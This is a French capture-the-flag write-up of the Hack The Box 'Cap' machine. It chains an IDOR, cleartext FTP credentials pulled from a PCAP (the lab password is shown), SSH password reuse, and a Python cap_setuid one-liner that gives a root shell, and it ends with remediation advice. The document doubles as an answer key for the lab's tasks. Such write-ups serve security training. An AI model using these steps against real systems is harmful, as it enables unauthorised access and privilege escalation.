# Cap

**Plateforme :** Hack The Box
**Catégorie :** Web / Linux
**Niveau :** Easy
**Date :** 12/10/2026

---

## Objectif

La machine héberge un tableau de bord de sécurité (« Security Dashboard »). L'objectif est d'exploiter une **référence directe à un objet non sécurisée
(IDOR)** pour accéder aux captures réseau d'autres utilisateurs, d'extraire des identifiants
transmis en clair dans un fichier PCAP, de les réutiliser pour ouvrir une session SSH, puis
d'abuser d'une **capability Linux** mal configurée pour obtenir les privilèges root.

---

## Vulnérabilité identifiée

Deux faiblesses sont enchaînées :

1. **IDOR** — L'application génère des « Security Snapshots » accessibles via une URL de la
   forme `/data/<id>`. L'identifiant `<id>` est un simple entier incrémental, non lié à la
   session. En le modifiant, on accède aux captures d'autres utilisateurs, dont celle de
   l'administrateur (`/data/0`).
2. **Identifiants en clair + réutilisation** — Le PCAP `0` contient une session **FTP**, un
   protocole non chiffré : le mot de passe de l'utilisateur `nathan` y transite en clair. Ce
   même mot de passe est réutilisé pour **SSH**.

La post-exploitation repose sur une **capability** `cap_setuid` positionnée sur le binaire
`/usr/bin/python3.8`, qui permet à n'importe quel utilisateur de devenir root.

---

## Reconnaissance

**Scan nmap :**

```bash
nmap -sV -sC 10.129.75.17
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn 20.0.4
```

> **Task 1 — How many TCP ports are open? → `3`**

- Port 21 — **FTP** (vsftpd 3.0.3)
- Port 22 — **SSH** (OpenSSH 8.2p1, Ubuntu)
- Port 80 — **HTTP** (Gunicorn / application Python)

**Accès au site web :**

En visitant `http://10.129.75.17`, on arrive sur un tableau de bord de sécurité qui affiche des
statistiques réseau en temps réel. Plusieurs fonctionnalités sont proposées, dont **« Security
Snapshot (5 Second PCAP + Analysis) »**.

En cliquant sur **Security Snapshot**, le serveur lance une capture de 5 secondes puis redirige
le navigateur vers une URL de la forme :

```
http://10.129.75.17/data/1
```

> **Task 2 — After running a "Security Snapshot", the browser is redirected to a path of the
> format `/[something]/[id]` → `data`**

Le segment `[id]` est un entier correspondant à l'identifiant de la capture.

---

## Exploitation

### 1. IDOR : accéder aux captures d'autres utilisateurs

L'identifiant dans `/data/<id>` n'est rattaché à aucune session. En remplaçant la valeur par
`0`, on accède à une capture qui ne nous appartient pas — celle générée par l'administrateur.

```
http://10.129.75.17/data/0
```

> **Task 3 — Are you able to get to other users' scans? → `yes`**

La page `/data/0` correspond à la toute première capture réalisée sur la machine et contient
des données sensibles.

> **Task 4 — What is the ID of the PCAP file that contains sensitive data? → `0`**

### 2. Récupération et analyse du PCAP

Chaque snapshot est téléchargeable au format PCAP via le lien **« Download »** de la page, soit :

```
http://10.129.75.17/download/0
```

```bash
wget http://10.129.75.17/download/0 -O 0.pcap
```

On ouvre la capture dans Wireshark (ou on filtre en ligne de commande). Le trafic contient une
session **FTP**, protocole en clair : les commandes `USER` et `PASS` sont directement lisibles.

```bash
tshark -r 0.pcap -Y ftp
```

```
FTP  Request: USER nathan
FTP  Response: 331 Please specify the password.
FTP  Request: PASS Buck3tH4TF0RM3!
FTP  Response: 230 Login successful.
```

> **Task 5 — Which application layer protocol in the pcap file can the sensitive data be found
> in? → `ftp`**

On récupère ainsi l'identifiant `nathan` et son mot de passe FTP.

### 3. Réutilisation du mot de passe sur SSH

Le même mot de passe est réutilisé sur un autre service. Comme SSH est ouvert (port 22), on teste
la connexion :

```bash
ssh nathan@10.129.75.17
```

> **Task 6 — We've managed to collect nathan's FTP password. On what other service does this
> password work? → `ssh`**

La connexion réussit : on obtient un shell en tant que `nathan`.

### 4. Lecture du flag utilisateur

```bash
cat /home/nathan/user.txt
```

### 5. Élévation de privilèges via capability

On recherche les binaires disposant de capabilities particulières :

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

> **Task 8 — What is the full path to the binary ... has special capabilities ... → `/usr/bin/python3.8`**

La capability **`cap_setuid`** autorise le binaire Python à changer d'UID sans restriction. On
l'utilise pour passer UID 0 (root) et lancer un shell :

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
# uid=0(root) gid=1000(nathan) groups=1000(nathan)
```

### 6. Lecture du flag root

```bash
cat /root/root.txt
```

---

## Résultat

Compromission complète via la chaîne : **IDOR → PCAP (creds FTP en clair) → réutilisation SSH →
capability `cap_setuid` sur Python → root**.

---

## Impact

En conditions réelles, cette chaîne permettrait à un attaquant de :

- Accéder aux captures réseau de tous les utilisateurs sans authentification spécifique (IDOR),
  exposant potentiellement des données confidentielles.
- Extraire des identifiants transmis en clair par des protocoles non chiffrés (FTP), puis les
  rejouer sur d'autres services en profitant de la **réutilisation de mots de passe**.
- Passer d'un accès utilisateur standard à un accès **root** en abusant d'une capability Linux
  trop permissive, prenant le contrôle total de la machine.

---

## Remédiation

- **Corriger l'IDOR** : rattacher chaque capture à la session/au compte qui l'a générée et
  vérifier l'autorisation côté serveur avant de servir `/data/<id>` ou `/download/<id>`. Utiliser
  des identifiants non prédictibles (UUID) plutôt qu'un entier incrémental.
- **Bannir les protocoles en clair** : remplacer FTP par **SFTP/FTPS** pour chiffrer les échanges
  et éviter l'exposition d'identifiants dans le trafic.
- **Interdire la réutilisation de mots de passe** et appliquer une politique de secrets robustes
  (idéalement clés SSH + MFA).
- **Retirer la capability** inutile sur Python :

  ```bash
  setcap -r /usr/bin/python3.8
  ```

  N'accorder `cap_setuid` qu'à des binaires dédiés et audités, jamais à un interpréteur généraliste.

---

## Références

- [HackTheBox — Cap](https://app.hackthebox.com/machines/Cap)
- [OWASP — Insecure Direct Object References (IDOR)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [GTFOBins — Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [man capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)
